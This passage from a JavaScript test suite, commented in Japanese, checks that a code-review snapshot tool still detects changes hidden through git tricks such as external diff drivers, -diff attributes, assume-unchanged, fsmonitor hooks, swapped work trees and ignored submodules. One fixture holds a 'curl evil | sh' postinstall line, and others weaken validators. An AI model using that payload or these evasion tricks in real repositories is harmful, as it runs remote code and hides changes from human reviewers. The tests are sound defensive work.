  const second = createSnapshot({ cwd: dir, baseRef: 'main' });

  const changed = JSON.parse(readFileSync(join(second.dir, 'changed-files.json'), 'utf-8'));
  assert.ok(
    changed.changedInFix.some((f) => f.path === 'docs/agent-workflows/gone.md'),
    '消えた untracked が修正差分の変更として残る',
  );
});

// AD-F（敵対的レビュー・実行済）: 利用者の git 設定・属性で、レビュアーが読む正本 patch を
// 無音で空にできた。diff.external / GIT_EXTERNAL_DIFF は diff 生成そのものを乗っ取り、
// .gitattributes の -diff / binary は内容を base85 へ潰して両シグナルを false へ落とす
test('AD-F: diff.external / GIT_EXTERNAL_DIFF で正本 patch を空にできない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  sh(dir, ['config', 'diff.external', '/bin/true']);
  write(dir, 'worker/auth.js', 'const RE = /^a$/;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'c']);

  const byConfig = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.match(
    readFileSync(join(byConfig.dir, 'base-to-current.patch'), 'utf-8'),
    /const RE = \/\^a\$\//,
    'diff.external で内容が消えない',
  );

  process.env.GIT_EXTERNAL_DIFF = '/bin/true';
  t.after(() => {
    delete process.env.GIT_EXTERNAL_DIFF;
  });
  const byEnv = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.match(
    readFileSync(join(byEnv.dir, 'base-to-current.patch'), 'utf-8'),
    /const RE = \/\^a\$\//,
    '環境変数でも内容が消えない（-c diff.external= では止まらない）',
  );
  delete process.env.GIT_EXTERNAL_DIFF;

  // textconv は属性値が `unset` にならないので、内容の読めなさでは検出できない。--no-textconv だけが守る
  sh(dir, ['config', '--unset', 'diff.external']);
  write(dir, '.gitattributes', '* text=auto eol=lf\n*.js diff=hide\n');
  sh(dir, ['config', 'diff.hide.textconv', "printf ''"]);
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'attrs']);
  const byTextconv = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.match(
    readFileSync(join(byTextconv.dir, 'base-to-current.patch'), 'utf-8'),
    /const RE = \/\^a\$\//,
    'textconv でも内容が消えない',
  );
});

// AD-F: 内容が読めないファイルを「変更なし」と判定しない。属性値を見て止める設計は、
// `-diff` 以外の書き方（`diff=<driver>` + `binary=true`）で素通りし（実測）、逆に実バイナリ
// 資産の `binary` 属性で誤って全面停止する。潰し方によらず「読める内容があるか」で見る
test('AD-F: 属性で binary へ潰された設計文書は fail-closed でシグナルが立つ', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'docs/agent-workflows/rule.md', '# r\n\n既存\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'c']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  for (const attrs of ['*.md -diff\n', '*.md diff=fmt\n']) {
    write(dir, '.gitattributes', `* text=auto eol=lf\n${attrs}`);
    sh(dir, ['config', 'diff.fmt.binary', 'true']);
    write(dir, 'docs/agent-workflows/rule.md', `# r\n\n既存\n完了条件: 承認を得ること${attrs}`);
    sh(dir, ['add', '.']);
    sh(dir, ['commit', '-qm', 'rule']);

    const s = createSnapshot({ cwd: dir, baseRef: 'main' });
    assert.equal(
      s.manifest.semanticDocChangeInFix,
      true,
      `内容が読めないまま「変更なし」と判定しない: ${attrs.trim()}`,
    );
  }
});

test('AD-F: 実バイナリ資産があっても snapshot 生成は止まらない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, '.gitattributes', '* text=auto eol=lf\n*.png binary\n');
  writeFileSync(join(dir, 'logo.png'), Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x00, 0x01]));
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'asset']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  // 実バイナリは属性が無くても git が binary patch にするので内容は読めない。classifyFile は
  // 画像を code とみなすため guard シグナルは立つ（過剰トリガー＝安全側）。重要なのは
  // **snapshot 生成が止まらない**こと — 属性を見て止めていた頃は観点別レビューごと起動不能だった
  writeFileSync(join(dir, 'logo.png'), Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x00, 0x02]));
  sh(dir, ['commit', '-qam', 'update asset']);
  const second = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.ok(second.snapshotId, '実バイナリ資産で snapshot 生成が止まらない');
  assert.equal(
    second.manifest.semanticDocChangeInFix,
    false,
    '設計文書ではないので doc は立たない',
  );
  // classifyFile は prose 以外を code とみなすため guard は立つ。**受け入れた過剰トリガー**で、
  // 1周回分の再探索コストと引き換えに「読めない変更を見逃さない」を取っている
  assert.equal(second.manifest.guardChangeInFix, true, '過剰トリガー（安全側）を固定する');
});

// AD-F: F14 の guard 側。untracked（U）の opaque なコード変更でも guard シグナルが立つ
// （doc 側は別テストで固定済み。status フィルタの誤混入を両経路で検出できるようにする）
test('AD-F: 内容が読めない untracked のコード変更でも guard シグナルが立つ', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, '.gitattributes', '* text=auto eol=lf\n*.js -diff\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'attrs']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  // コミットせず untracked のまま置く（status U）
  write(dir, 'worker/newauth.js', 'const RE = /^admin$/;\n');

  assert.equal(createSnapshot({ cwd: dir, baseRef: 'main' }).manifest.guardChangeInFix, true);
});

// AD-G（敵対的レビュー・実行済）: 見出しの接頭辞を変える git 設定が固定されておらず、
// mnemonicPrefix は untracked の対象検証を全件誤判定させて snapshot 生成ごと止め、
// noprefix は `b/` で始まる正当なパスを恒久的に opaque へ落としていた
test('AD-G: 見出しの接頭辞を変える git 設定でレビュー対象が変わらない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  sh(dir, ['config', 'diff.mnemonicPrefix', 'true']);
  sh(dir, ['config', 'diff.noprefix', 'true']);
  write(dir, 'b/docs-note.md', '# n\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'c']);
  write(dir, 'src/new.js', 'export const n = 1;\n');

  const { dir: snapDir } = createSnapshot({ cwd: dir, baseRef: 'main' });
  const inPatch = new Set(
    splitPatchByFile(readFileSync(join(snapDir, 'base-to-current.patch'), 'utf-8')).map(
      (f) => f.path,
    ),
  );
  assert.ok(inPatch.has('src/new.js'), 'untracked の見出しが誤判定されない');
  assert.ok(inPatch.has('b/docs-note.md'), '`b/` 始まりのパスを剥がしすぎない');
});

// AD-G: opaque 判定を `code` に絞ると、test も docs 配下の dep もどちらの集合にも入らず、
// `tests/** -diff` でガードの検証手段そのものを潰せた
test('AD-G: テストを潰しても guard シグナルが立つ（種別を問わない）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'tests/x.test.js', 'assert.equal(1, 1);\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'c']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  write(dir, '.gitattributes', '* text=auto eol=lf\ntests/** -diff\n');
  write(dir, 'tests/x.test.js', '// assertion を消した\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'gut tests']);

  assert.equal(createSnapshot({ cwd: dir, baseRef: 'main' }).manifest.guardChangeInFix, true);
});

// AD-G: 新規成果物の追加は status U でも意味的変更。commit しないだけでシグナルを回避できた
test('AD-G: untracked の新規設計文書でも semanticDoc シグナルが立つ', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  // マーカー語彙も構造行も持たない平文（内容判定では拾えない）
  write(dir, 'docs/agent-workflows/newthing.md', 'これは平文です\n語彙を避けています\n');

  assert.equal(createSnapshot({ cwd: dir, baseRef: 'main' }).manifest.semanticDocChangeInFix, true);
});

// AD-H: 通常ファイル以外の untracked は `--no-index` が別ファイルの diff を返す（実測:
// `assets` → `assets/null`）。patch へ載せないだけにして、changedFiles に残った当該パスを
// hasOpaque が「読めないファイル」として拾う。throw にすると symlink 1本でレビュー基盤が止まる
test('AD-H: 通常ファイルでない untracked は patch へ載せず、シグナルで fail-closed にする', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  mkdirSync(join(dir, 'shared'), { recursive: true });
  writeFileSync(join(dir, 'shared', 'null'), Buffer.from([0x00, 0x01, 0x02]));
  write(dir, 'shared/payload.js', 'payload\n');
  symlinkSync('shared', join(dir, 'assets'));

  const { dir: snapDir, changedFiles, manifest } = createSnapshot({ cwd: dir, baseRef: 'main' });
  const patch = readFileSync(join(snapDir, 'base-to-current.patch'), 'utf-8');
  assert.ok(!patch.includes('assets/null'), 'changedFiles に無い幽霊パスを patch へ載せない');
  assert.ok(
    changedFiles.some((f) => f.path === 'assets'),
    'symlink 自体は changedFiles に残す（黙って消さない）',
  );
  assert.equal(manifest.guardChangeInFix, true, '内容を読めないので fail-closed に倒す');
});

// AD-I（減算 round 27）: 上のテストは初回 snapshot＝修正差分が完全 diff と同一の条件でしか
// 固定していなかった。2周目以降で「untracked の非通常ファイルだけが増えた」周回は修正差分が
// 空文字列になり、detectGuardChange の空 patch 早期 return が hasOpaque を到達不能にして
// fail-open していた（実測: fixPatch.length=0 / changedInFix=[assets,U] / guard=false）
test('AD-I: 修正差分が空でも読めない変更があれば guard シグナルが立つ', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'shared/payload.js', 'payload\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'c']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  // この周回の変更は untracked の symlink 1本だけ＝ patch へ載らない
  symlinkSync('shared', join(dir, 'assets'));

  const { dir: snapDir, manifest } = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.equal(
    readFileSync(join(snapDir, 'previous-to-current.patch'), 'utf-8'),
    '',
    '前提: 修正差分は空になる',
  );
  assert.equal(manifest.guardChangeInFix, true, '内容を読めないので fail-closed に倒す');
});

// AD-I: 上の fail-closed を「patch が空なら常に true」で塞ぐと、変更が無い周回でも毎回
// 全系統が再起動する。changedFiles が空であることを根拠に false へ倒せることを固定する
test('AD-I: 変更が無い周回では空の修正差分で過剰トリガーしない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/a.js', 'export const a = 1;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'c']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  const { manifest } = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.equal(manifest.guardChangeInFix, false);
  assert.equal(manifest.semanticDocChangeInFix, false);
});

// AD-J（仕様・敵対的レビュー）: git が「作業ツリーの状態を正しく報告しない」3経路。いずれも
// patch にも changedFiles にも痕跡が残らず hasOpaque でも拾えない完全な fail-open だった（実測）
test('AD-J: 利用者のグローバル除外設定で untracked をレビュー対象から外せない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'a.txt', 'a\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'c']);
  write(dir, 'myexcludes', 'worker/\n');
  sh(dir, ['config', 'core.excludesFile', join(dir, 'myexcludes')]);
  write(dir, 'worker/newauth.js', 'export const auth = 1;\n');

  const { changedFiles } = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.ok(
    changedFiles.some((f) => f.path === 'worker/newauth.js'),
    '高リスク領域の新規ファイルが痕跡なく消えない',
  );
});

test('AD-J: assume-unchanged / skip-worktree で tracked の変更を隠せない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/a.js', 'export const a = 1;\n');
  write(dir, 'src/b.js', 'export const b = 1;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'c']);
  sh(dir, ['update-index', '--assume-unchanged', 'src/a.js']);
  sh(dir, ['update-index', '--skip-worktree', 'src/b.js']);
  write(dir, 'src/a.js', 'export const a = evil();\n');
  write(dir, 'src/b.js', 'export const b = evil();\n');

  const { changedFiles, manifest } = createSnapshot({ cwd: dir, baseRef: 'main' });
  const paths = new Set(changedFiles.map((f) => f.path));
  assert.ok(paths.has('src/a.js') && paths.has('src/b.js'), '報告を止められた tracked も残す');
  assert.equal(manifest.guardChangeInFix, true, '内容を読めないので fail-closed に倒す');
});

// サブディレクトリ実行で ls-files がパススペック無指定だと cwd 配下しか返さず、
// cwd の外の assume-unchanged が丸ごと消える（隠された改変が「変更なし」で通る fail-open）。
// cwd 配下でも cwd 相対パスが返り、worker/ の highRisk 判定が落ちる（最終独立レビューで実測）
test('AD-J: サブディレクトリ実行でも assume-unchanged を見落とさない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'worker/auth.js', 'export const a = 1;\n');
  write(dir, 'src/deep/x.js', 'export const x = 1;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'c']);
  sh(dir, ['update-index', '--assume-unchanged', 'worker/auth.js']);
  write(dir, 'worker/auth.js', 'export const a = evil();\n');

  const { changedFiles, manifest } = createSnapshot({
    cwd: join(dir, 'src', 'deep'),
    baseRef: 'main',
  });
  assert.ok(
    manifest.unreportedPaths.includes('worker/auth.js'),
    'cwd の外のフラグ付きファイルもリポジトリ相対パスで残す',
  );
  assert.equal(manifest.guardChangeInFix, true, '内容を読めないので fail-closed に倒す');
  const byPath = new Map(changedFiles.map((f) => [f.path, f]));
  assert.equal(byPath.get('worker/auth.js')?.highRisk, true, 'highRisk 判定が落ちない');
});

// fsmonitor は assume-unchanged と同じ「git が報告自体を止める」機構だが、痕跡が残らず
// 自己修復もしない。打ち消さないと tracked の改変が全経路から無音で消える（敵対的レビューで実測）
test('AD-J: core.fsmonitor が「変更なし」と答えても tracked の改変を落とさない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/gate.js', 'export const validate = (p) => /^[a-z]+$/.test(p);\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'c']);
  // base にも同じコミットを含める。含めないと「コミット済みの追加」が完全 diff に出てしまい、
  // 作業ツリーの改変が隠れていてもアサーションが通る（＝テストが穴を検出しない）
  sh(dir, ['branch', '-f', 'main', 'HEAD']);
  const hook = join(dir, 'fsm-hook.sh');
  writeFileSync(hook, '#!/bin/sh\nprintf \'%s\\0\' "1"\n', { mode: 0o755 });
  sh(dir, ['config', 'core.fsmonitor', hook]);
  sh(dir, ['config', 'core.fsmonitorHookVersion', '2']);
  sh(dir, ['status', '--porcelain=v1']); // fsmonitor-valid を index に載せる
  write(dir, 'src/gate.js', 'export const validate = () => true;\n');

  const { changedFiles, manifest } = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.ok(
    changedFiles.some((f) => f.path === 'src/gate.js'),
    'fsmonitor が黙っても改変が変更ファイルに残る',
  );
  assert.equal(manifest.guardChangeInFix, true, 'ガード変更のシグナルが立つ');
});

// GIT_WORK_TREE / core.worktree は作業ツリーごと別ディレクトリへ差し替える。git はそちらを見て
// 「clean」と答えるため、改変も untracked も痕跡ゼロで消える（dirty=false / unreportedPaths=[]）。
// env 経路は -c で打ち消せないので、設定ではなく結果（ルートが cwd を含むか）を検査する
test('AD-J: 作業ツリーの差し替えを「変更なし」と読まず fail-loud する', (t) => {
  const dir = makeRepo();
  const other = mkdtempSync(join(tmpdir(), 'review-snapshot-wt-'));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  t.after(() => rmSync(other, { recursive: true, force: true }));
  write(dir, 'scripts/guard.js', 'export const validate = (p) => /^[a-z]+$/.test(p);\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'c']);
  sh(dir, ['branch', '-f', 'main', 'HEAD']);
  // 同一コミットの clean checkout を作り、そちらを作業ツリーとして差し替える
  execFileSync('git', ['clone', '-q', dir, other, '--no-hardlinks'], { stdio: 'ignore' });
  write(dir, 'scripts/guard.js', 'export const validate = () => true;\n');

  sh(dir, ['config', 'core.worktree', other]);
  assert.throws(
    () => createSnapshot({ cwd: dir, baseRef: 'main' }),
    /core\.worktree/,
    '差し替えられた作業ツリーを黙って「変更なし」にしない',
  );
  sh(dir, ['config', '--unset', 'core.worktree']);

  // env 経路。cwd との相対関係を見るだけでは、差し替え先を cwd の祖先に置かれると通過する
  // （実測）ため、機構そのものを拒否する
  const prev = process.env.GIT_WORK_TREE;
  process.env.GIT_WORK_TREE = other;
  t.after(() => {
    if (prev === undefined) delete process.env.GIT_WORK_TREE;
    else process.env.GIT_WORK_TREE = prev;
  });
  assert.throws(
    () => createSnapshot({ cwd: dir, baseRef: 'main' }),
    /GIT_WORK_TREE/,
    'env 経路も拒否する',
  );
});

test('AD-J: submodule の未コミット変更を .gitmodules の ignore = all で隠せない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const sub = join(dir, '..', `sub-${Date.now()}`);
  sh(dir, ['init', '-q', '-b', 'main', sub]);
  sh(sub, ['config', 'user.email', 'test@example.com']);
  sh(sub, ['config', 'user.name', 'test']);
  writeFileSync(join(sub, 'f.txt'), 'v1\n');
  sh(sub, ['add', '.']);
  sh(sub, ['commit', '-qm', 'v1']);
  t.after(() => rmSync(sub, { recursive: true, force: true }));

  write(dir, 'x.txt', 'x\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'c']);
  sh(dir, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', sub, 'sub']);
  write(dir, '.gitmodules', `[submodule "sub"]\n\tpath = sub\n\turl = ${sub}\n\tignore = all\n`);
  sh(dir, ['add', '-A']);
  sh(dir, ['commit', '-qm', 'add sub']);
  // 作業ツリーで submodule のポインタだけを動かす（commit しない）
  // `submodule add` が clone した作業コピー（dir/sub）は元リポジトリ（sub）とは別の
  // リポジトリで、L867-868 の identity を引き継がない。ここで設定しないと global 設定の
  // 無い環境（GitHub Actions runner）で `Author identity unknown` になる（#583）
  sh(join(dir, 'sub'), ['config', 'user.email', 'test@example.com']);
  sh(join(dir, 'sub'), ['config', 'user.name', 'test']);
  writeFileSync(join(dir, 'sub', 'f.txt'), 'v2\n');
  sh(join(dir, 'sub'), ['add', '.']);
  sh(join(dir, 'sub'), ['commit', '-qm', 'v2']);

  const { changedFiles, manifest } = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.ok(
    changedFiles.some((f) => f.path === 'sub'),
    'status も stash create も報告しない変更を落とさない',
  );
  assert.equal(manifest.guardChangeInFix, true, '内容を読めないので fail-closed に倒す');
});

// AD-H: submodule の可視性は `.gitmodules` の `ignore = all`（**PR 内のファイル**で指定できる）
// でも利用者 config でも消せた。patch / name-status / numstat の3経路が同時に縮むため
// hasOpaque でも検出できない完全な fail-open だった
test('AD-H: .gitmodules の ignore = all で submodule の変更を隠せない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  // 実 submodule を用意せず、gitlink を直接 index へ書いて同じ状態を作る
  const gitlink = 'a'.repeat(40);
  sh(dir, ['update-index', '--add', '--cacheinfo', `160000,${gitlink},sub`]);
  write(dir, '.gitmodules', '[submodule "sub"]\n\tpath = sub\n\turl = ../sub\n');
  sh(dir, ['add', '.gitmodules']);
  sh(dir, ['commit', '-qm', 'add sub']);

  const bumped = 'b'.repeat(40);
  sh(dir, ['update-index', '--cacheinfo', `160000,${bumped},sub`]);
  write(dir, '.gitmodules', '[submodule "sub"]\n\tpath = sub\n\turl = ../sub\n\tignore = all\n');
  sh(dir, ['add', '.gitmodules']);
  sh(dir, ['commit', '-qm', 'bump sub with ignore']);

  const { changedFiles } = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.ok(
    changedFiles.some((f) => f.path === 'sub'),
    'gitlink の変更が changedFiles から消えない',
  );
});

test('AD-H: color.ui=always でも patch が ANSI 混じりにならない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  sh(dir, ['config', 'color.ui', 'always']);
  write(dir, 'src/base.js', 'export const a = 2;\n');
  sh(dir, ['commit', '-qam', 'c']);

  const { dir: snapDir } = createSnapshot({ cwd: dir, baseRef: 'main' });
  const patch = readFileSync(join(snapDir, 'base-to-current.patch'), 'utf-8');
  assert.ok(!patch.includes('\u001b['), '正本 patch に ANSI が混ざらない');
  assert.deepEqual(
    splitPatchByFile(patch).map((f) => f.path),
    ['src/base.js'],
    '色付きだとパースが 0 件になり全ファイルが opaque へ落ちる',
  );
});

// AD-F: 内容が読めないコード変更は status を問わず fail-closed。M / U だけを対象にすると、
// **新規追加**（A）のコードファイルを -diff で潰す経路が残る（実測で guardChangeInFix=false だった）
test('AD-F: 新規追加のコードファイルを潰しても guard シグナルが立つ', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, '.gitattributes', '* text=auto eol=lf\n*.js -diff\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'attrs']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  write(dir, 'worker/auth.js', 'const RE = /^admin$/;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'new guard']);

  assert.equal(createSnapshot({ cwd: dir, baseRef: 'main' }).manifest.guardChangeInFix, true);
});

// AD-F: untracked（status U）も内容が読めなければ「変更なし」と判定しない。M だけを対象に
// すると、新規の設計文書を -diff で潰す経路が残る（実測で semanticDocChangeInFix=false だった）
test('AD-F: 内容が読めない untracked の設計文書でもシグナルが立つ', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, '.gitattributes', '* text=auto eol=lf\n*.md -diff\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'attrs']);
  write(dir, 'docs/agent-workflows/rule.md', '# r\n\n完了条件: 承認を得ること\n');

  assert.equal(createSnapshot({ cwd: dir, baseRef: 'main' }).manifest.semanticDocChangeInFix, true);
});

// AD-F: 属性の対象を「依存 manifest 以外」に限る設計は、classifyFile が任意の package.json を
// dep と判定するため worker/package.json まで除外していた。内容の読めなさで見れば種別に依存しない
test('AD-F: package.json を binary へ潰しても guard シグナルが立つ', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'package.json', '{"name":"x"}\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'c']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  write(dir, '.gitattributes', '* text=auto eol=lf\npackage.json -diff\n');
  write(dir, 'package.json', '{"name":"x","scripts":{"postinstall":"curl evil | sh"}}\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'evil']);

  assert.equal(
    createSnapshot({ cwd: dir, baseRef: 'main' }).manifest.guardChangeInFix,
    true,
    '内容が読めないコード変更を「ガード変更なし」と判定しない',
  );
});

// AD-F: untracked の内容が無音で正本から消える経路。git diff --no-index は「差分あり」も
// 「アクセスできない」もどちらも exit 1 を返すため、失敗を差分なしと同一視していた
test('AD-F: サブディレクトリ実行でも untracked の内容が正本へ載る', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/deep/keep.js', 'export const k = 1;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'c']);
  write(dir, 'worker/newauth.js', 'const RE = /^new$/;\n');

  const { dir: snapDir } = createSnapshot({ cwd: join(dir, 'src', 'deep'), baseRef: 'main' });
  const patch = readFileSync(join(snapDir, 'base-to-current.patch'), 'utf-8');
  assert.match(patch, /const RE = \/\^new\$\//, 'cwd の外の untracked が消えない');
  assert.ok(
    splitPatchByFile(patch).some((f) => f.path === 'worker/newauth.js'),
    '見出しがリポジトリ相対に正規化される',
  );
  assert.ok(!patch.includes(dir), '絶対パスを patch に残さない');
});

// AD-F: patch 見出しは行頭の +++ だけで判定していたため、++ で始まる内容行が幽霊ファイル
// 見出しに化け、以降の行が実パスの検査対象から外れた
// 見出しを手書きで組み立てていた頃は、git のクォート規則を再実装しそこねて TAB を含む
// untracked 名の見出しが壊れ、AD-E が塞いだ「patch と changedFiles が突き合わない」失敗様式が
// untracked 経路で再現していた。左オペランドを /dev/null にして git に生成させることで消えた
test('AD-F: 特殊文字を含む untracked 名でも見出しと changedFiles が突き合う', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  // ドル記号は見出しを手書きしていた頃に置換パターンとして展開され、絶対パスが漏れていた
  const names = [
    'src/a\tb.js',
    'src/q"x.js',
    'src/sp ace.js',
    'src/日本語.js',
    'src/a$&b.js',
    "src/c$'d.js",
    'src/e$`f.js',
    'src/g$$h.js',
  ];
  for (const n of names) write(dir, n, 'export const x = 1;\n');

  const { dir: snapDir, changedFiles } = createSnapshot({ cwd: dir, baseRef: 'main' });
  const patch = readFileSync(join(snapDir, 'base-to-current.patch'), 'utf-8');
  const inPatch = new Set(splitPatchByFile(patch).map((f) => f.path));
  const inFiles = new Set(changedFiles.map((f) => f.path));
  for (const n of names) {
    assert.ok(inPatch.has(n), `patch 見出しから生のパスを取り出せる: ${n}`);
    assert.ok(inFiles.has(n), `changedFiles にも同じパスで載る: ${n}`);
  }
  assert.ok(!patch.includes(dir), '絶対パスを patch に残さない');
});

test('AD-F: 空の untracked ファイルも正本 patch に記録される', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/empty.js', '');

  const { dir: snapDir, changedFiles } = createSnapshot({ cwd: dir, baseRef: 'main' });
  const patch = readFileSync(join(snapDir, 'base-to-current.patch'), 'utf-8');
  // 内容が無いので `---` / `+++` 見出しは出ない（＝ splitPatchByFile には現れない）が、
  // ファイルの新設自体は正本 patch に残る。以前は untracked ごと patch から消えていた
  assert.match(patch, /diff --git a\/src\/empty\.js b\/src\/empty\.js/);
  assert.match(patch, /new file mode/);
  assert.ok(changedFiles.some((f) => f.path === 'src/empty.js'));
});

test('AD-F: ++ で始まる内容行が幽霊見出しにならない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'docs/agent-workflows/rule.md', '# r\n\n既存\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'c']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  write(
    dir,
    'docs/agent-workflows/rule.md',
    '# r\n\n既存\n++ 参考\n完了条件: レビュー担当者の承認を得ること\n',
  );
  sh(dir, ['commit', '-qam', 'rule']);
  const second = createSnapshot({ cwd: dir, baseRef: 'main' });

  const paths = splitPatchByFile(
    readFileSync(join(second.dir, 'previous-to-current.patch'), 'utf-8'),
  ).map((f) => f.path);
  assert.ok(!paths.includes('参考'), '内容行を見出しとして採用しない');
  assert.equal(second.manifest.semanticDocChangeInFix, true, '拘束力のある記述の追加を見逃さない');
});

// AD-F: 非 UTF-8 のファイル名は argv へ戻す時点で U+FFFD に潰れ、実ファイルに当たらない。
// `--no-index` の失敗は exit 1（＝差分あり）と区別できないため、黙って patch から消えていた。
// AD-J で throw を止めた（stray ファイル1個で全レビューの入口が停止していた）ので、
// 「落とさない」の担保先は unreportedPaths とシグナルへ移っている
test('AD-F: 非 UTF-8 のファイル名を持つ untracked は fail-closed（入口は止めない）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  // Shift_JIS の「認証」相当のバイト列（UTF-8 として解釈できない）
  const name = Buffer.concat([
    Buffer.from(join(dir, 'worker_')),
    Buffer.from([0x94, 0xa7, 0x8f, 0xd8]),
    Buffer.from('.js'),
  ]);
  writeFileSync(name, 'const RE = /^a$/;\n');

  const { manifest } = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.equal(manifest.unreportedPaths.length, 1, '検査できなかったことを成果物に残す');
  assert.equal(manifest.guardChangeInFix, true, 'レビュー対象から黙って落とさない');
});

test('splitPatchByFile: ハンク本文の +++ / --- を見出しにしない', () => {
  const patch = [
    'diff --git a/docs/x.md b/docs/x.md',
    '--- a/docs/x.md',
    '+++ b/docs/x.md',
    '@@ -1 +1,3 @@',
    ' 既存',
    '+++ 参考',
    '+完了条件: green',
    '--- 区切り',
    '',
  ].join('\n');
  assert.deepEqual(
    splitPatchByFile(patch).map((f) => f.path),
    ['docs/x.md'],
    'ハンク内の見出し形は内容行として扱う',
  );
});

// AD-E（敵対的レビュー・実行済）: `-z` は利用者の core.quotepath 設定に関わらず生のパスを返す
// （実測）。これが無いと ` " ` 等が C クォートされてパス正規表現が全て外れ、
// worker/（セキュリティ境界）の変更が highRisk:false へ落ちる
test('AD-E: パスの表記に関わらず生のまま分類器へ渡る（高リスク・設計文書の判定が効く）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'worker/認証.js', 'export const auth = 1;\n');
  write(dir, 'worker/a"b.js', 'export const q = 1;\n');
  write(dir, 'docs/agent-workflows/レビュー手順.md', '# 手順\n');
  write(dir, 'src/新規 ファイル.js', 'export const c = 3;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'ja']);

  const { changedFiles } = createSnapshot({ cwd: dir, baseRef: 'main' });
  const byPath = new Map(changedFiles.map((f) => [f.path, f]));
  for (const path of ['worker/認証.js', 'worker/a"b.js']) {
